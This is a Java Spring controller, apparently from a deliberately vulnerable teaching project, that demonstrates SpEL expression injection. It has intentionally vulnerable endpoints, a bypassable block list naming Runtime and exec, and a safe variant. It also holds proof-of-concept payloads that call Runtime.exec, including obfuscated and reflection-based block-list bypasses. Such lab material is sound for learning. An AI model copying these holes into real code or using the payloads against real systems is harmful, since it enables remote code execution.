package com.best.hello.controller;

import io.swagger.annotations.Api;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.regex.Matcher;
import java.util.regex.Pattern;


/**
 * SpEL Injection (Spring 表达式注入)
 *
 * @date 2021/06/24
 * <p>
 * 审计的函数
 * 1. SpelExpressionParser
 * 2. getValue
 */

@Api("Spring 表达式注入")
@RestController
@RequestMapping("/SPEL")
public class SpEL {
    Logger log = LoggerFactory.getLogger(SpEL.class);

    @GetMapping("/vul")
    public String vul1(String ex) {
        ExpressionParser parser = new SpelExpressionParser();

        // StandardEvaluationContext权限过大，可以执行任意代码，默认使用可以不指定
        EvaluationContext evaluationContext = new StandardEvaluationContext();
        Expression exp = parser.parseExpression(ex);

        String result = exp.getValue(evaluationContext).toString();
        log.info("[vul] SpEL");
        return result;
    }

    /**
     * 黑名单过滤绕过
     */
    @GetMapping("/vul2")
    public String vul2(String ex) {
        String[] black_list = {"java.+lang", "Runtime", "exec.*\\("};
        for (String s : black_list) {
            Matcher matcher = Pattern.compile(s).matcher(ex);
            if (matcher.find()) {
                return "黑名单过滤";
            }
        }

        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(ex);
        String result = exp.getValue().toString();
        log.info("[vul] SpEL 黑名单绕过: " + ex);
        return result;
    }


    @GetMapping("/safe")
    public String spelSafe(String ex) {
        // SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用
        ExpressionParser parser = new SpelExpressionParser();
        EvaluationContext simpleContext = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        Expression exp = parser.parseExpression(ex);
        String result = exp.getValue(simpleContext).toString();
        log.info("[safe] SpEL");
        return result;
    }


    /**
     * 本地测试
     */
    public static void main(String[] args) {
        // 算数运算
        String ex1 = "100*2";

        // 对象实例化
        String ex2 = "new java.util.Date().getTime()";
        String ex3 = "new java.lang.String('hello')";

        // T(Type): 使用"T(Type)"来表示java.lang.Class实例，同样，只有java.lang 下的类才可以省略包名
        String ex4 = "T(java.lang.Runtime).getRuntime().exec('open -a Calculator')";
        String ex5 = "T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(111).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)))";

        // 利用反射绕过黑名单过滤
        String ex6 = "T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"open\",\"-a\",\"Calculator\"})";

        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(ex3);
        System.out.println(exp.getValue());
    }


}
